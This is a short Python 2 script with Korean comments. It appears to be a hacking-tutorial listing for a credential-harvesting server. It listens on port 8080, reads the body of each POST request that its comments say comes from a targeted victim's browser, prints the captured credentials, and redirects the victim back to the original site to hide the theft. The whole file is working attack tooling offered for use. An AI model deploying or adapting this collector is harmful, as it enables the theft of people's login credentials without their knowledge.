#-*- coding: utf-8 -*-
import SimpleHTTPServer, SocketServer, urllib

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length=int(self.headers['Content-Length']) # 클라이언트의 타겟 브라우저가 전송한 요청이 도착하면 Content-Length 헤더를 읽어 크기를 판단
        creds=self.rfile.read(content_length).decode('utf-8') # 요청 내용을 읽음
        print creds
        site = self.path[1:] # 원본 사이트를 알아냄
        self.send_response(301) 
        self.send_header('Location', urllib.unquote(site)) # 클라이언트의 타겟 브라우저를 원본 사이트의 메인 페이지로 리다이렉션시킴
        self.end_headers()

def main():
    server=SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
    server.serve_forever()
    
if __name__=="__main__":
    main()